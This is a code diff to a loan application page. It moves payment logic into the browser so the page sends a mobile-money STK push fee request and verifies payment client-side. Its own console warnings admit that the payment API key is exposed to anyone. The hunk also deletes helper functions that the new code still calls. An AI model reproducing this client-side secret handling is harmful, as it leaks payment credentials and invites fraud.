-                if (!response.ok) throw new Error(result.error || 'Phone normalization failed');
-                return result.normalized_phone;
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                loadingOverlay.style.display = 'flex';
+
+                // Normalize (use client-side)
+                let normalizedPhone = normalizePhoneManually(phoneNumber);
+                if (!normalizedPhone || normalizedPhone.length !== 12) {
+                    throw new Error('Invalid phone number');
+                }
+
+                // Send STK push directly to MegaPay
+                const paymentResponse = await sendPayHeroSTK(
+                    normalizedPhone,
+                    selectedLoan.fee,
+                    selectedLoan.amount
+                );
+
+                if (paymentResponse && paymentResponse.reference) {
+                    paymentReference = paymentResponse.reference;
+
+                    loadingOverlay.style.display = 'none';
+                    showSTKOverlay(normalizedPhone, selectedLoan.fee);
+
+                    const paymentSuccess = await checkPaymentStatus(paymentReference, 20);
+
+                    hideSTKOverlay();
+
+                    if (paymentSuccess) {
+                        storeApprovalAndRedirect();
+                    } else {
+                        throw new Error('Payment verification failed');
+                    }
+                } else {
+                    throw new Error('Payment initiation failed - no reference');
+                }
             } catch (error) {
-                console.error('Phone normalization error:', error);
-                return normalizePhoneManually(phone);
+                console.error('Payment error:', error);
+                document.getElementById('loadingOverlay').style.display = 'none';
+                hideSTKOverlay();
+
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+
+                const manualVerified = await showManualPaymentModal(selectedLoan.fee);
+                if (manualVerified) {
+                    storeApprovalAndRedirect();
+                }
             }
         }
 
-        function normalizePhoneManually(phone) {
-            let normalized = phone.replace(/\D/g, '');
-            if (normalized.startsWith('0') && normalized.length === 10) {
-                normalized = '254' + normalized.substring(1);
-            } else if (normalized.startsWith('254') && normalized.length === 12) {
-                // already good
-            } else if (normalized.startsWith('+254')) {
-                normalized = normalized.substring(1);
-            } else if (normalized.length === 9) {
-                normalized = '254' + normalized;
-            }
-            return normalized;
-        }
-
-        // STK overlay controls
-        function showSTKOverlay(phoneNumber, amount) {
-            const overlay = document.getElementById('stkOverlay');
-            const phoneEl = document.getElementById('stkPhoneNumber');
-            const amountEl = document.getElementById('stkAmount');
-            
-            const displayPhone = phoneNumber.startsWith('254') ? 
-                `0${phoneNumber.substring(3)}` : phoneNumber;
-            phoneEl.textContent = displayPhone;
-            amountEl.textContent = `Ksh ${amount}`;
-            
-            let seconds = 0;
-            const timerEl = document.getElementById('stkTimer');
-            stkTimerInterval = setInterval(() => {
-                seconds++;
-                const minutes = Math.floor(seconds / 60);
-                const secs = seconds % 60;
-                timerEl.textContent = `Verifying payment... ${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-            }, 1000);
-            
-            overlay.style.display = 'flex';
-        }
-
-        function hideSTKOverlay() {
-            document.getElementById('stkOverlay').style.display = 'none';
-            if (stkTimerInterval) {
-                clearInterval(stkTimerInterval);
-                stkTimerInterval = null;
-            }
-            if (paymentTimer) {
-                clearInterval(paymentTimer);
-                paymentTimer = null;
-            }
-        }
-
-        // Clean up
+        // ================================================================
+        // 10. CLEANUP
+        // ================================================================
         window.addEventListener('beforeunload', () => {
             hideSTKOverlay();
         });
+
+        console.log('✅ Fully consolidated apply.html loaded (ALL backend logic in browser)');
+        console.warn('⚠️  Your MegaPay API key is exposed. Anyone can steal it.');
+        console.warn('⚠️  MegaPay may block browser requests due to CORS. If so, this will fail.');
     </script>
 </body>
 </html>
